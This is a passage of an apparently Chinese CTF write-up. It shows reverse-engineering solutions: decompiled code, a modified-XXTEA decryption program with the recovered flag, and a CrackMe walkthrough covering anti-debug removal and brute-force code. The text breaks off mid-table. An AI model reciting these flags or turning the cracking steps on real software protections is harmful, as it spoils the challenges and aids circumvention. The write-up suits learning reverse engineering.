number\">0</span><span class=\"token punctuation\">;</span> m <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>m <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v27<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> v10<span class=\"token punctuation\">[</span>m <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n          <span class=\"token function\">sub_140087C02</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1401A11A8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token function\">j_system</span><span class=\"token punctuation\">(</span>byte_1401A11A0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">goto</span> LABEL_20<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token function\">sub_140087C02</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1401A11C0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">j_system</span><span class=\"token punctuation\">(</span>byte_1401A11A0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\nLABEL_20<span class=\"token operator\">:</span>\n  <span class=\"token function\">j__RTC_CheckStackVars</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v9<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>_RTC_framedesc <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_1401A1140<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">j___security_check_cookie</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span>v10 <span class=\"token operator\">^</span> v34<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_1401F8E9B</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>很清晰看出来是XXTEA加密，密钥是固定种子随机数随机得到的，Delta被魔改，然后密文也能看到。</p>\n<p><strong>注：写WP时用的是旧版附件分析，缺失了后面16字节密文</strong></p>\n<p>完整密文数据：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token number\">0xa9934e2f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30b90fa</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xdcbf1d3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x328b5bde</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x44fab4e</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1dcf0051</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85ebbe55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93aa773a</span></code></pre>\n\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DELTA</span> <span class=\"token expression\"><span class=\"token number\">0x61C88646</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MX</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>z <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">^</span> y <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">>></span> <span class=\"token number\">3</span> <span class=\"token operator\">^</span> z <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">^</span> y<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> e<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">xxtea</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> <span class=\"token operator\">*</span>v<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">,</span> <span class=\"token keyword\">uint32_t</span> <span class=\"token keyword\">const</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> y<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> sum<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> p<span class=\"token punctuation\">,</span> rounds<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">/* Coding Part */</span>\n    <span class=\"token punctuation\">&#123;</span>\n        rounds <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\n        sum <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">do</span>\n        <span class=\"token punctuation\">&#123;</span>\n            sum <span class=\"token operator\">+=</span> DELTA<span class=\"token punctuation\">;</span>\n            e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">&lt;</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> p<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> MX<span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>z <span class=\"token operator\">==</span> <span class=\"token number\">0xA4F41487</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"11\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">==</span> <span class=\"token number\">0xA4F41487</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"11\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> MX<span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">--</span>rounds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">&lt;</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">/* Decoding Part */</span>\n    <span class=\"token punctuation\">&#123;</span>\n        n <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>n<span class=\"token punctuation\">;</span>\n        rounds <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\n        sum <span class=\"token operator\">=</span> rounds <span class=\"token operator\">*</span> DELTA<span class=\"token punctuation\">;</span>\n        y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">do</span>\n        <span class=\"token punctuation\">&#123;</span>\n            e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> p<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> MX<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> MX<span class=\"token punctuation\">;</span>\n            sum <span class=\"token operator\">-=</span> DELTA<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">--</span>rounds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xAABB</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint32_t</span> Enc<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0xa9934e2f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30b90fa</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xdcbf1d3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x328b5bde</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x44fab4e</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1dcf0051</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85ebbe55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93aa773a</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">xxtea</span><span class=\"token punctuation\">(</span>Enc<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.32s\\n\"</span><span class=\"token punctuation\">,</span> Enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>flag{th15_15_51mpLe_obf_R19Ht?}</p>\n<h3 id=\"CrackMe\"><a href=\"#CrackMe\" class=\"headerlink\" title=\"CrackMe\"></a>CrackMe</h3><p>有反调试，在WinMain开头断点，使用ScyllaHide一把梭去除（（。</p>\n<p><img src=\"/images/47-1744626745338-52.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/48-1744626745338-53.png\" loading=\"lazy\"></p>\n<p>从WinMain可以跟踪到窗口消息函数，图四就是验证函数按钮消息。</p>\n<p><img src=\"/images/49-1744626745338-54.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/50-1744626745338-55.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/51-1744626745338-56.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/52-1744626745338-57.png\" loading=\"lazy\"></p>\n<p>从TLS那边可以看到启动了一个线程，线程函数如下</p>\n<p><img src=\"/images/53-1744626745339-58.png\" loading=\"lazy\"></p>\n<p>这边死循环判断了一个值，然后调用CallBack，随便输入flag，点击验证，发现会先调用CallBack中的mark2函数进行第一次验证。</p>\n<p><img src=\"/images/54-1744626745339-59.png\" loading=\"lazy\"></p>\n<p>将这边v4都异或上0xBB会得到”flag{“五个字符，就明白这边是检测输入flag开头是否为”flag{“，进行了第一次验证，然后继续下一次验证进入了case 5的mark3函数。</p>\n<p><img src=\"/images/55-1744626745339-60.png\" loading=\"lazy\"></p>\n<p>mark3这边是用固定值生成了一个v5数值列表，a1是输入的字符串，但是可以看到+5跳过了前面的五个字符，然后对括号内的前7个字符做一些加密计算然后和v5列表前7个数值进行检验。</p>\n<p>这边就可以直接提取v5生成的数值列表，然后利用爆破得到括号内的前七个字符。</p>\n<p><img src=\"/images/56-1744626745339-61.png\" loading=\"lazy\"></p>\n<p>爆破代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> box1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC0BA6CAC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A05DF1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9ABFB3B7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB40BBE36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74B1D29A</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xEE0E612D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2EB40D81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB3667A2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73DC1683</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE963A534</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x29D9C998</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x076DC419</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7D7A8B5</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x5D681B02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9DD277AE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBDBDF21D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D079EB1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7B82D06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x270241AA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09B64C2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC90C2087</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x53B39330</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9309FF9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0EDB8832</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCE61E49E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x54DE5729</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x94643B85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBAD03604</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A6A5AA8</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xE0D5E91F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x206F85B3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA00AE279</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60B08ED5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA0F3D62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3AB551CE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14015C4F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD4BB30E3</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x4E048354</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8EBEEFF8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x136C9856</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3D6F4FA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4969474D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x89D32BE1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA7672660</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67DD4ACC</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xFD62F97B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3DD895D7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1DB71064</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDD0D7CC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47B2CF7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8708A3D3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA9BCAE52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6906C2FE</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xF3B97149</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33031DE5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAED16A4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E6B06E7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4D4B550</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x346ED9FC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1ADAD47D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDA60B8D1</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x40DF0B66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x806567CA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B64C2B1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5BDEAE1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC1611DAA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01DB7106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F6F7C87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEFD5102B</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x756AA39C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB5D0CF30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2802B89E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8B8D432</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72076785</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB2BD0B29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9C0906A8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5CB36A04</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xC60CD9B3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06B6B51F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26D930AC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE6635C00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7CDCEFB7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBC66831B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x92D28E9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5268E236</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xC8D75181</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x086D3D2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95BF4A83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5505262F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCFBA9598</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F00F934</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21B4F4B5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE10E9819</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x7BB12BAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBB0B4702</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B6E20C8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFBD44C64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x616BFFD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA1D1937F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8F659EFE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4FDFF252</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xD56041E5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15DA2D49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88085AE7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48B2364B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD20D85FC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12B7E950</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C03E4D1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFCB9887D</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x66063BCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6BC5766</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86D3D2D5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4669BE79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDCD60DCE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C6C6162</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32D86CE3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF262004F</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x68DDB3F8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA867DF54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35B5A8FA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF50FC456</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6FB077E1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF0A1B4D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81BE16CC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41047A60</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xDBBBC9D7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B01A57B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEDB88321</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D02EF8D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB7BD5C3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x77073096</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59B33D17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x990951BB</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x03B6E20C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC30C8EA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5EDEF90E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9E6495A2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04DB2615</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4614AB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEAD54738</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A6F2B94</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xB0D09823</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x706AF48F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5005713C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90BF1D90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A00AE27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCABAC28B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE40ECF0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24B4A3A6</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xBE0B1011</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7EB17CBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE3630B13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23D967BF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB966D408</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79DCB8A4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5768B525</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97D2D989</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x0D6D6A3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCDD70692</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4DB26158</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8D080DF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17B7BE43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD70DD2EF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9B9DF6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3903B3C2</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xA3BC0075</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63066CD9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFED41B77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E6E77DB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4D1C46C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x646BA8C0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4ADFA541</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8A65C9ED</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x10DA7A5A</span><span class=\"token punctuation\">,</span> <span class=\"token 